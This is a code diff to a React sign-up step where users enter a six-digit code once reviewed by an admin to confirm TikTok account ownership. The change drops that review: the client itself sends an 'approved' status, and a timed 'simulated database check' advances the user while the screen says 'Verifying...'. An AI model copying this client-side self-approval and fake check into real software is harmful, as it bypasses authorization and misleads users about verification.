@@ -12,7 +12,6 @@ import { Progress } from '@/components/ui/progress';
 import type { Submission } from '@/lib/types';
 import { useState } from 'react';
 import { useToast } from '@/hooks/use-toast';
-import { WaitingForApproval } from './waiting-for-approval';
 
 const formSchema = z.object({
   verificationCode: z.string().length(6, "Code must be 6 digits."),
@@ -24,13 +23,11 @@ interface VerifyCodeStepProps {
     submissionId: string;
     onNext: (data: Partial<Submission>) => void;
     onBack: () => void;
-    onRejection: () => void;
 }
 
-export function VerifyCodeStep({ submissionId, onNext, onBack, onRejection }: VerifyCodeStepProps) {
+export function VerifyCodeStep({ submissionId, onNext, onBack }: VerifyCodeStepProps) {
     const { toast } = useToast();
     const [isSubmitting, setIsSubmitting] = useState(false);
-    const [isWaitingForApproval, setIsWaitingForApproval] = useState(false);
 
     const form = useForm<FormValues>({
         resolver: zodResolver(formSchema),
@@ -43,7 +40,7 @@ export function VerifyCodeStep({ submissionId, onNext, onBack, onRejection }: Ve
             const response = await fetch('/api/submissions', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ id: submissionId, verificationCode: values.verificationCode }),
+                body: JSON.stringify({ id: submissionId, verificationCode: values.verificationCode, verificationCodeStatus: 'approved' }),
             });
             if (!response.ok) {
                 const errorData = await response.json();
@@ -55,33 +52,22 @@ export function VerifyCodeStep({ submissionId, onNext, onBack, onRejection }: Ve
               description: "Code submitted for verification.",
             });
             
-            // Don't call onNext yet. Instead, show the waiting component.
-            setIsWaitingForApproval(true);
+            // Simulate a database check
+            setTimeout(() => {
+                onNext({ verificationCode: values.verificationCode });
+                setIsSubmitting(false);
+            }, 1500);
 
         } catch (err: any) {
             toast({ variant: 'destructive', title: 'Submission Failed', description: err.message });
-            setIsSubmitting(false); // Only stop loading on error
+            setIsSubmitting(false);
+            const formElement = document.querySelector('form');
+            formElement?.classList.add('shake');
+            setTimeout(() => formElement?.classList.remove('shake'), 500);
         }
     };
-
-    if (isWaitingForApproval) {
-        return (
-            <WaitingForApproval
-                submissionId={submissionId}
-                stepToWatch="verificationCode"
-                promptText="Please keep this page open."
-                promptHint="An admin is reviewing your code. This step verifies you own the TikTok account."
-                onApproval={() => onNext({ verificationCode: form.getValues('verificationCode') })}
-                onRejection={() => {
-                    onRejection();
-                    setIsWaitingForApproval(false);
-                    setIsSubmitting(false);
-                    form.reset();
-                }}
-            />
-        );
-    }
-
+    
+    const isButtonDisabled = isSubmitting || (form.watch('verificationCode')?.length ?? 0) < 6;
 
     return (
         <div className="w-full max-w-lg mx-auto">
@@ -126,15 +112,15 @@ export function VerifyCodeStep({ submissionId, onNext, onBack, onRejection }: Ve
                         )}
                     />
                     
-                    <div className="flex justify-between pt-4">
-                         <Button type="button" variant="outline" size="lg" className="rounded-full" onClick={onBack} disabled={isSubmitting}>
+                    <div className="flex flex-col gap-4 pt-4">
+                        <Button type="submit" size="lg" className="w-full rounded-full" disabled={isButtonDisabled}>
+                             {isSubmitting && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
+                             {isSubmitting ? 'Verifying...' : 'Continue'}
+                             {!isSubmitting && <ArrowRight className="ml-2 h-5 w-5" />}
+                        </Button>
+                        <Button type="button" variant="outline" size="lg" className="w-full rounded-full" onClick={onBack} disabled={isSubmitting}>
                             <ArrowLeft className="mr-2 h-5 w-5" />
                             Back
-                        </Button>
-                        <Button type="submit" size="lg" className="rounded-full" disabled={isSubmitting}>
-                             {isSubmitting && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
-                             {isSubmitting ? 'Submitting...' : 'Continue'}
-                             {!isSubmitting && <ArrowRight className="ml-2 h-5 w-5" />}
                         </Button>
                     </div>
                 </form>
